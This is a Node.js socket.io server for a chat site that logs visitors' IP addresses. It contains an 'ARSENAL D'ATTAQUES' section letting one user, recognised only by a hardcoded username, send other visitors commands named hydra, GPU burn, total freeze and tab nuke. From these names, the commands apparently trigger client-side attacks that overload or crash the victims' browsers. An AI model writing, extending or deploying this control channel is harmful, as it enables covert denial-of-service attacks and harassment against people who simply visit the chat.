const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const PORT = process.env.PORT || 3000;

let registry = { users: {}, blacklist: new Set() };
app.use(express.static(__dirname));
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

io.on('connection', (socket) => {
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress;

    socket.on('init_user', (data) => {
        if (registry.blacklist.has(ip)) return socket.disconnect();
        registry.users[socket.id] = {
            id: socket.id, name: data.name, ip: ip,
            chef: data.name === "toucheur2pp", premium: true
        };
        sync();
    });

    // --- ARSENAL D'ATTAQUES ---
    socket.on('attack_hydra', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_hydra'); });
    socket.on('attack_gpu', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_gpu_burn'); });
    socket.on('attack_freeze', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_total_freeze'); });
    socket.on('attack_tab_nuke', (sid) => { if(registry.users[socket.id]?.chef) io.to(sid).emit('exe_tab_nuke'); });

    socket.on('chat_msg', (msg) => {
        const u = registry.users[socket.id];
        if (u) io.emit('chat_msg', { text: msg.text, name: u.name, chef: u.chef });
    });

    socket.on('disconnect', () => { delete registry.users[socket.id]; sync(); });
    function sync() { io.emit('sync_users', Object.values(registry.users)); }
});

http.listen(PORT, () => console.log("NEBULA OMNIPOTENCE V40 ACTIVE"));
